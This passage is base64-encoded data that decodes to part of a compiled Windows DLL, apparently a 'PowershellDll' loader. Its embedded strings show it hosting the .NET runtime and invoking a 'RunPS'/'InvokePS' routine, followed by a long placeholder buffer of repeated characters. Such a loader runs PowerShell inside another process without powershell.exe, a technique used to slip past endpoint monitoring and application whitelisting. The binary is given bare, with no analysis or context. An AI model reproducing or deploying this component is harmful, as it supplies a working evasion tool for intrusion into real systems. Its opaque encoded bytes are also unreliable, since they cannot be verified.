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BmAG8AOgA6AEcAZQB0AEkAbgB0AGUAcgBmAGEAYwBlACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABDb3JCaW5kVG9SdW50aW1lAAAAAAAAAABDAG8AdQBsAGQAIABuAG8AdAAgAGYAaQBuAGQAIABBAFAASQAgAEMAbwByAEIAaQBuAGQAVABvAFIAdQBuAHQAaQBtAGUAAAB3AGsAcwAAAEMAbwByAEIAaQBuAGQAVABvAFIAdQBuAHQAaQBtAGUAIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAABtAHMAYwBvAHIAZQBlAC4AZABsAGwAAABQcm9ncmFtAAAAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGMAcgBlAGEAdABlACAAdABoAGUAIAByAHUAbgB0AGkAbQBlACAAaABvAHMAdAAKAAAAAABDAEwAUgAgAGYAYQBpAGwAZQBkACAAdABvACAAcwB0AGEAcgB0ACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAABSAHUAbgB0AGkAbQBlAEMAbAByAEgAbwBzAHQAOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAQQBwAHAARABvAG0AYQBpAG4ASQBkACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABJAEMAbwByAFIAdQBuAHQAaQBtAGUASABvAHMAdAA6ADoARwBlAHQARABlAGYAYQB1AGwAdABEAG8AbQBhAGkAbgAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgAGQAZQBmAGEAdQBsAHQAIABBAHAAcABEAG8AbQBhAGkAbgAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABsAG8AYQBkACAAdABoAGUAIABhAHMAcwBlAG0AYgBsAHkAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAZwBlAHQAIAB0AGgAZQAgAFQAeQBwAGUAIA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sAEAIAAAA4KwAQAwAAAEArABAEAAAASCsAECIFkxkFAAAAbD4AEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP////+AKwAQAAAAAIgrABABAAAAkCsAEAIAAACYKwAQAwAAAKArABAAAAAA5P///wAAAADI////AAAAAP7///9gGgAQZhoAEAAAAACwGwAQAAAAAMQ+ABABAAAAzD4AEAAAAABYiwAQAAAAAP////8AAAAAEAAAACAbABD+////AAAAAND///8AAAAA/v///wAAAAAUHgAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAI8eABAAAAAA/v///wAAAADU////AAAAAP7///9kHwAQgx8AEAAAAAD+////AAAAANj///8AAAAA/v///2MiABB2IgAQAAAAAEwlABAAAAAAdD8AEAIAAACAPwAQnD8AEBAAAACMiwAQAAAAAP////8AAAAADAAAALokABAAAAAAqIsAEAAAAAD/////AAAAAAwAAAAgJQAQAAAAAEwlABAAAAAAyD8AEAMAAADYPwAQgD8AEJw/ABAAAAAAxIsAEAAAAAD/////AAAAAAwAAADtJAAQAAAAAAAAAAAAAAAAAAAAAFgOpFkAAAAAMkAAAAEAAAABAAAAAQAAAChAAAAsQAAAMEAAAEAZAABEQAAAAABQb3dlcnNoZWxsRGxsLmRsbABWb2lkRnVuYwAAAADcQAAAAAAAAAAAAADaQQAAADAAACBBAAAAAAAAAAAAAOhBAABEMAAATEEAAAAAAAAAAAAAmEIAAHAwAACsQQAAAAAAAAAAAADGQwAA0DAAAHBBAAAAAAAAAAAAAOZDAACUMAAAgEEAAAAAAAAAAAAABkQAAKQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAALhBAADIQQAAKEQAAE5EAABaRAAAdkQAAJREAACoRAAAvEQAANhEAADyRAAACEUAAB5FAAA4RQAATkUAADhEAAAAAAAACQAAgA8AAIAVAACAGgAAgAIAAIAGAACAFgAAgJsBAIAIAACAEAAAgAAAAAD2QQAADEIAACJCAAAsQgAARkIAAHhCAABiRQAAXkIAAAAAAADgQgAA2EIAAOpCAAAAAAAAvEMAAK5DAAB6QwAAXkMAACJDAAAQQwAAAkMAAPZCAACWQwAAPEMAAAAAAACqQgAAvEIAAAAAAACoA0xvYWRMaWJyYXJ5VwAAnQJHZXRQcm9jQWRkcmVzcwAAS0VSTkVMMzIuZGxsAABPTEVBVVQzMi5kbGwAABAAX19DeHhGcmFtZUhhbmRsZXIzAAABAF9DeHhUaHJvd0V4Y2VwdGlvbgAASABtZW1zZXQAADUAX2V4Y2VwdF9oYW5kbGVyNF9jb21tb24AIQBfX3N0ZF9leGNlcHRpb25fY29weQAAIgBfX3N0ZF9leGNlcHRpb25fZGVzdHJveQAlAF9fc3RkX3R5cGVfaW5mb19kZXN0cm95X2xpc3QAAFZDUlVOVElNRTE0MC5kbGwAAAAAX19hY3J0X2lvYl9mdW5jAAcAX19zdGRpb19jb21tb25fdmZ3cHJpbnRmAAAYAGZyZWUAABkAbWFsbG9jAAAIAF9jYWxsbmV3aAA4AF9pbml0dGVybQA5AF9pbml0dGVybV9lAEEAX3NlaF9maWx0ZXJfZGxsABkAX2NvbmZpZ3VyZV9uYXJyb3dfYXJndgAANQBfaW5pdGlhbGl6ZV9uYXJyb3dfZW52aXJvbm1lbnQAADYAX2luaXRpYWxpemVfb25leGl0X3RhYmxlAAA+AF9yZWdpc3Rlcl9vbmV4aXRfZnVuY3Rpb24AJABfZXhlY3V0ZV9vbmV4aXRfdGFibGUAHwBfY3J0X2F0ZXhpdAAXAF9jZXhpdAAAYXBpLW1zLXdpbi1jcnQtc3RkaW8tbDEtMS0wLmRsbABhcGktbXMtd2luLWNydC1oZWFwLWwxLTEtMC5kbGwAAGFwaS1tcy13aW4tY3J0LXJ1bnRpbWUtbDEtMS0wLmRsbABQAkdldExhc3RFcnJvcgAA0QNNdWx0aUJ5dGVUb1dpZGVDaGFyALIDTG9jYWxGcmVlAIIFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABDBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAJAkdldEN1cnJlbnRQcm9jZXNzAGEFVGVybWluYXRlUHJvY2VzcwAAbQNJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AC0EUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIACgJHZXRDdXJyZW50UHJvY2Vzc0lkAA4CR2V0Q3VycmVudFRocmVhZElkAADWAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAEsDSW5pdGlhbGl6ZVNMaXN0SGVhZABnA0lzRGVidWdnZXJQcmVzZW50AEYAbWVtY3B5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQBwAEAAAAAAKAAAAAAAAAAQAAoAAAAAA/////wAAAACxGb9ETuZAu3WYAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBB